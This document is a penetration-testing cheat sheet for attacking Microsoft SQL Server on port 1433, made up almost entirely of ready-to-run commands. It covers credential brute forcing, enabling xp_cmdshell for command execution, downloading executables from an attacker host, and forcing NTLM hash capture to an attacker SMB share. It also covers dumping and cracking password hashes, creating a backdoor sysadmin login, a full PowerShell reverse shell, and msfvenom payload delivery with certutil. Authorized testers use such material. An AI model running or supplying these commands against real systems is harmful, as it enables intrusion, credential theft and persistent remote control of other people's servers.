# Port 1433 - MSSQL

## Table of Contents

- [Enumeration](#enumeration)
  - [Impacket](#impacket)
  - [sqsh](#sqsh)
  - [Basic SQL Queries](#basic-sql-queries)
  - [NetExec](#netexec)
  - [Nmap Scripts](#nmap-scripts)
  - [Metasploit](#metasploit)
- [Brute Force](#brute-force)
  - [Nmap Script](#nmap-script-recommended)
  - [Hydra](#hydra)
  - [Metasploit Brute Force](#metasploit-brute-force)
- [Exploit](#exploit)
  - [xp_cmdshell](#xp_cmdshell)
  - [File Operations](#file-operations)
  - [Hash Capture](#hash-capture)
- [Post-Exploitation](#post-exploitation)
  - [Password Hash Extraction](#password-hash-extraction)
  - [Impersonation](#impersonation)
  - [Linked Server Exploitation](#linked-server-exploitation)
  - [Persistence](#persistence)
  - [Reverse Shell](#reverse-shell)

---

## Enumeration

### Quick Check (One-liner)

```shell
# Check MSSQL + get version
nxc mssql $rhost -u 'sa' -p 'sa' --local-auth -q "SELECT @@version" 2>/dev/null || echo "Auth required"

# Nmap all scripts
nmap -p 1433 --script "ms-sql-*" $rhost
```

### Impacket (One-liner)

```shell
# SQL auth + execute query
impacket-mssqlclient sa:'password'@$rhost -q "SELECT @@version; SELECT name FROM sys.databases;"

# Windows auth
impacket-mssqlclient $domain/$user:'password'@$rhost -windows-auth

# Pass-the-Hash
impacket-mssqlclient $user@$rhost -hashes :$ntlm_hash -windows-auth
```

### NetExec (One-liner)

```shell
# List databases
nxc mssql $rhost -u '$user' -p '$pass' --local-auth -q "SELECT name FROM sys.databases"

# Check sysadmin
nxc mssql $rhost -u '$user' -p '$pass' --local-auth -q "SELECT IS_SRVROLEMEMBER('sysadmin')"

# List permissions
nxc mssql $rhost -u '$user' -p '$pass' --local-auth -q "SELECT * FROM sys.server_permissions;"
```

### Nmap Scripts

```shell
# Service detection
nmap -p 1433 $rhost

# Instance discovery (UDP 1434)
nmap -sU -p 1434 --script "ms-sql-discover" $rhost

# Brute force
nmap -p 1433 --script "ms-sql-brute" --script-args userdb=users.txt,passdb=passwords.txt $rhost
```

### Metasploit

```shell
# Instance discovery
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS $rhost
run

# Login check
use auxiliary/scanner/mssql/mssql_login
set RHOSTS $rhost
run
```

---

## Brute Force

### Nmap Script (Recommended)

> Brute force MSSQL using Nmap scripts

```shell
nmap -p 1433 --script "ms-sql-brute" --script-args userdb=users.txt,passdb=passwords.txt $rhost
```

> Brute force with specific credentials

```shell
nmap -p 1433 --script "ms-sql-brute" --script-args mssql.username=sa,mssql.password=password $rhost
```

> Brute force with default wordlists

```shell
nmap -p 1433 --script "ms-sql-brute" --script-args userdb=/usr/share/seclists/Usernames/mssql-usernames-nansh0u-guardicore.txt,passdb=/usr/share/seclists/Passwords/mssql-passwords-nansh0u-guardicore.txt $rhost
```

### Hydra

> Brute force with user and password lists

```shell
hydra -L userlist.txt -P passlist.txt mssql://$rhost
```

> Brute force sa account

```shell
hydra -l sa -P /usr/share/wordlists/rockyou.txt $rhost mssql
```

### Metasploit Brute Force

> MSSQL login brute force module

```shell
use auxiliary/scanner/mssql/mssql_login
set RHOSTS $rhost
set USER_FILE /path/to/users.txt
set PASS_FILE /path/to/passwords.txt
run
```

---

## Exploit

### xp_cmdshell

#### Enable xp_cmdshell

```shell
# Via NetExec
nxc mssql $rhost -u 'user' -p 'pass' --local-auth -q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"

# Via SQL
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

#### Execute Commands

```shell
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig';
EXEC xp_cmdshell 'net user';

# Via NetExec
nxc mssql $rhost -u 'user' -p 'pass' --local-auth -x "whoami"
```

### File Operations

#### Read Files

```shell
SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents;

EXEC xp_cmdshell 'type C:\Windows\win.ini';
```

#### Write Files

```shell
EXEC xp_cmdshell 'echo test > C:\Temp\test.txt';

# Download from web
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://attacker/shell.exe -OutFile C:\Temp\shell.exe"';
```

### Hash Capture

> Force MSSQL to authenticate to attacker SMB share

```shell
# Start Responder
sudo responder -I eth0

# On MSSQL
EXEC xp_dirtree '\\attacker-ip\share';
EXEC xp_fileexist '\\attacker-ip\share\file';
EXEC master..xp_subdirs '\\attacker-ip\share';
```

---

## Post-Exploitation

### Password Hash Extraction

```shell
# Extract password hashes (requires sysadmin)
SELECT name, password_hash FROM sys.sql_logins;

# Using Metasploit
use auxiliary/scanner/mssql/mssql_hashdump
set RHOSTS $rhost
set USERNAME sa
set PASSWORD password
run

# Crack with hashcat
hashcat -m 1731 hashes.txt rockyou.txt
```

### Impersonation

```shell
# Check for impersonation permissions
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

# Impersonate user
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

### Linked Server Exploitation

```shell
# List linked servers
EXEC sp_linkedservers;
SELECT * FROM sys.servers;

# Execute on linked server
EXEC ('SELECT @@version') AT [LinkedServerName];
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LinkedServer];
```

### Persistence

```shell
# Create backdoor user
CREATE LOGIN backdoor WITH PASSWORD = 'P@ssw0rd123!';
EXEC sp_addsrvrolemember 'backdoor', 'sysadmin';
```

### Reverse Shell

```shell
# PowerShell reverse shell via xp_cmdshell
EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''attacker-ip'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
```

```shell
nxc mssql $rhost -u 'user' -p 'pass' --local-auth -x "C:\Users\Public\shell.exe"
```

### Generate Windows Payload

- Attacker

```shell
# Windows reverse shell payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=4444 -f exe -o shell.exe
```

```shell
msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST eth0; set LPORT 4444; exploit -j'
```

```shell
python3 -m http.server 8080
```

- Victim (via xp_cmdshell)

```shell
# Download using certutil (Windows native)
nxc mssql $rhost -u 'user' -p 'pass' --local-auth -x "certutil -urlcache -split -f http://$lhost:8080/shell.exe C:\Users\Public\shell.exe"
```

```shell
# Execute payload
nxc mssql $rhost -u 'user' -p 'pass' --local-auth -x "C:\Users\Public\shell.exe"
```
